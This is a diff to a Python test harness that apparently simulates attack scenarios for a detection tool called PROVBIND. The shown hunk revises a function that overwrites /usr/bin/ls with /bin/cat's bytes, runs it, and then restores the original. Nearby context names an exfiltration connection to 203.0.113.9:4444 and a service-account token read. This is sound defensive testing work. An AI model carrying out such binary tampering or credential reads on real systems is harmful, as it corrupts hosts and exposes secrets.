@@ -91,14 +91,19 @@ def exfil_connect(host: str = "203.0.113.9", port: int = 4444) -> str:
 def overwrite_binary(target: str = "/usr/bin/ls", source: str = "/bin/cat") -> str:
     """R-U4 (binary tampering). Overwrite the declared /usr/bin/ls with /bin/cat's bytes, then run
     it. Both are conforming binaries already in the image; only the ephemeral container's copy is
-    changed, and the container is discarded after the run. PROVBIND reports D_write on a declared
-    file (there is no D_hash without runtime hashing). Nothing is deleted."""
+    changed. The overwrite is the event PROVBIND reports as D_write on a declared file (there is no
+    D_hash without runtime hashing). We restore the original bytes afterwards so the pod stays usable
+    across repeated runs; nothing is deleted."""
+    import shutil
     real = os.path.realpath(target)     # /usr/bin/ls may be a symlink; resolve it (CLAUDE.md)
     src = os.path.realpath(source)
-    import shutil
-    shutil.copyfile(src, real)          # replace the declared file's bytes in place
+    backup = "/tmp/.ls.orig"
+    if not os.path.exists(backup):
+        shutil.copyfile(real, backup)   # keep the declared file's original bytes for restore
+    shutil.copyfile(src, real)          # the D_write on the declared file
     r = subprocess.run([real], stdin=subprocess.DEVNULL, capture_output=True, timeout=10, check=False)
-    return f"overwrote {real} with {src}; ran it rc={r.returncode}"
+    shutil.copyfile(backup, real)       # restore, so ls works for later scenarios in the same pod
+    return f"overwrote {real} with {src} (rc={r.returncode}), then restored it"
 
 
 def credential_read(token_path: str = SA_TOKEN,
